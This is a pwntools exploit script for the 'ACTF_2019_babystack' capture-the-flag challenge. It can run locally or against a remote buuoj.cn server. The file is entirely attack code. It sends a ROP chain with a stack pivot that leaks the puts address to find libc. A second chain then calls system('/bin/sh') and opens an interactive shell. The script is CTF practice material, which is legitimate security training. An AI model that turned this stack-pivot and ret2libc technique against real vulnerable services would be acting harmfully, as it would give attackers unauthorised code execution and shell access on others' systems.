import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ACTF_2019_babystack')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ACTF_2019_babystack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',25637)
			elf=ELF('./ACTF_2019_babystack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]



		pop_rdi=0x0000000000400ad3
		leave=0x0000000000400a18
		main_addr=0x400800
		io.recvuntil("How many bytes of your message?\n")
		io.sendline(str(0xe0))
		io.recvuntil('0x')
		stack_addr1=int(io.recv(12),16)
		io.recv()
		pay=p64(pop_rdi)
		pay+=p64(elf.got['puts'])
		pay+=p64(elf.plt['puts'])
		pay+=p64(main_addr)		
		pay=pay.ljust(0xd0,'\x00')
		pay+=p64(stack_addr1-0x8)
		pay+=p64(leave)
		io.send(pay)
		io.recv(8)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		io.recvuntil("How many bytes of your message?\n")
		io.sendline(str(0xe0))
		io.recvuntil('0x')
		stack_addr1=int(io.recv(12),16)
		io.recv()
		pay=p64(pop_rdi)
		pay+=p64(libc.search('/bin/sh\x00').next())
		pay+=p64(libc.sym['system'])
		pay+=p64(main_addr)		
		pay=pay.ljust(0xd0,'\x00')
		pay+=p64(stack_addr1-0x8)
		pay+=p64(leave)
		io.send(pay)








		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue